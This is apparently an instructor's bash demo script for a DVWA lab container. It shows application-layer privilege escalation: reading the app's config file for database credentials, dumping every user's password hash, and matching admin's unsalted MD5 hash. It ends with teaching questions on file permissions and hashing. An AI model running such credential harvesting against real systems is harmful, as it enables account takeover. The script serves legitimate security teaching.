#!/usr/bin/env bash
# Day 17 — DVWA "privilege escalation", application-layer flavor.
# Run this FROM THE WSL UBUNTU TERMINAL, inside the www-data shell you already caught with
# demo-reverse-shell-dvwa.sh (type these commands there), OR run this script standalone —
# it re-creates the same path non-interactively via `podman exec` so you can show it fast.
#
# IMPORTANT — tell students this up front: this is NOT an OS root escalation. I checked:
# this container has no sudo, no exploitable SUID binary, no writable root-owned file, no
# Linux capabilities set anywhere. A thin app container like this often has nothing to
# escalate to at the OS level — that's msf2's job (see demo-privesc-msf2.sh).
# What this DOES show: a low-privilege web shell reading the app's OWN config file for a
# database password, then using it to bypass the app's login entirely and read every user's
# password hash straight out of the database — including admin's.
#
# The chain: www-data shell -> read config.inc.php -> DB credential -> query `users` table
# -> crack a hash -> you ARE admin (at the application layer), with no OS privilege needed.
#
# Verified against this lab 2026-10-05/06: DVWA 10.89.1.20 (podman container `dvwa`).

set -u

echo "=========================================================="
echo "[*] Step 1 — as www-data, read the app's own config file"
echo "=========================================================="
echo "    (inside your reverse shell: cat /var/www/html/config/config.inc.php)"
sudo podman exec --user www-data dvwa cat /var/www/html/config/config.inc.php | grep -E "db_user|db_password|db_database"

echo
echo "=========================================================="
echo "[*] Step 2 — use that credential to talk to the database directly"
echo "    (no web login, no session, no CSRF token needed)"
echo "=========================================================="
echo "    mysql -h 127.0.0.1 -u app -pvulnerables dvwa -e \"SELECT user,password FROM users;\""
# mysqld can still be starting up for a few seconds right after the container (re)starts —
# retry briefly instead of failing on a cold lab.
for i in 1 2 3 4 5 6 7 8 9 10; do
  if sudo podman exec --user www-data dvwa mysql -h 127.0.0.1 -u app -pvulnerables dvwa \
       -e "SELECT user,password FROM users;" 2>/tmp/dvwa-mysql-err.txt; then
    break
  fi
  sleep 2
done
cat /tmp/dvwa-mysql-err.txt 2>/dev/null | grep -v '^$'

echo
echo "=========================================================="
echo "[*] Step 3 — crack one. These are unsalted MD5 (DVWA teaches this exact mistake)."
echo "=========================================================="
echo "    admin's hash: 5f4dcc3b5aa765d61d8327deb882cf99"
echo -n "    md5('password') = "
echo -n "password" | md5sum | cut -d' ' -f1
echo "    Match. admin's password is 'password' — crackable on sight, not even brute force."

echo
echo "[*] That's the escalation: a web-app bug (command injection) -> a low-priv OS shell"
echo "    -> the app's own secret -> every account's credential, including admin's."
echo "[*] Ask the class: what SHOULD config.inc.php's permissions be? (not world-readable by"
echo "    the same user that runs the web app!) And: why is this password unsalted MD5?"
